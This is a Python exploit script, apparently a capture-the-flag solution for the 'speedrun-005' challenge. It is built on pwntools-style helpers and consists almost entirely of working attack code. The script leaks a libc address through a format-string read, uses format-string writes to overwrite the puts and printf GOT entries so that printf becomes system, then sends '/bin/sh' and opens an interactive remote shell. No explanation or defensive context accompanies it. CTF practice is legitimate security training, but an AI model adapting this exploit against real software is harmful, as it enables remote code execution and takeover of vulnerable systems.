#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './speedrun-005'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'speedrun-005.quals2019.oooverflow.io', 'port':31337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_got_puts       = binf.got['puts']
addr_got_printf     = binf.got['printf']
addr_x              = 0x40069d
addr_plt_printf     = binf.plt['printf']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_puts        = libc.sep_function['puts']

#==========

def attack(conn, **kwargs):
    overwrite = dict()
    if env.check('remote'):
        overwrite[0x601020] = addr_x+0x90
    else:
        overwrite[addr_got_puts] = addr_x

    exploit  = '%129$p__'
    exploit += fmtstr_payload(7, overwrite, numbwritten = 16, write_size = 'byte')
    conn.sendafter('time? ', exploit)

    conn.recvuntil('Interesting ')
    addr_libc_puts = int(conn.recvuntil('__', drop=True), 16) - 0x1a2
    libc.address = addr_libc_puts - offset_libc_puts
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']


    overwrite = dict()
    if env.check('remote'):
        overwrite[0x601030] = addr_libc_system
    else:
        overwrite[addr_got_printf] = addr_libc_system
    exploit  = fmtstr_payload(6, overwrite, numbwritten = 0, write_size = 'byte')
    conn.sendafter('time? ', exploit)

    if env.check('remote'):
        conn.send('/bin/sh\x00')
    else:
        conn.sendafter('found', '/bin/sh\x00')

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
